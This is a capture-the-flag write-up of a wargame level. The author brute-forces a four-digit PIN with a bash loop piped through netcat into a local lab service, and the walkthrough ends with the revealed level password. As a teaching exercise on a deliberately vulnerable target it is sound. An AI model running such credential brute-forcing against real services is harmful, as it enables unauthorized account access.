Bandit Level 24 → Level 25

In this level, a service is running locally on port 30002. The service returns the password 
for bandit25 only when it receives:
The correct bandit24 password
A valid 4-digit PIN
Since the PIN is unknown and can range from 0000 to 9999, brute-forcing all possibilities is
required.
Instead of manually trying 10,000 PINs, I automated the process using a shell script and 
sent all combinations to the service.

Step 1: Create a Working Directory
I first created a temporary directory to store my script:
mkdir /tmp/bandit24
cd /tmp/bandit24

Step 2: Create the Brute-Force Script
I created a script file:
nano script.sh
Inside the script, I added the following code:
#!/bin/bash
for i in {0..9}{0..9}{0..9}{0..9}
do
  echo "BANDIT24_PASSWORD $i"
done

This script generates all 4-digit PIN combinations from 0000 to 9999 and prints them along with the bandit24 password in the format expected by the service.

Step 3: Make the Script Executable
I changed the file permissions so the script could be executed:

chmod +x script.sh

Step 4: Send the Attempts to the Service

I ran the script and piped its output directly into the service running on port 30002
using netcat:
./script.sh | nc localhost 30002

Result

The script automatically sent 10,000 login attempts to the service. The service
tested each PIN, and when the correct PIN was reached, it responded with:

Correct!
The password of bandit25 is: iCi86ttT4KSNe1armKiwbQNmB3YJP3q4

Conclusion

By automating the brute-force process with a shell script and piping the output into the service, I successfully retrieved the password for Bandit Level 25 without manual effort.
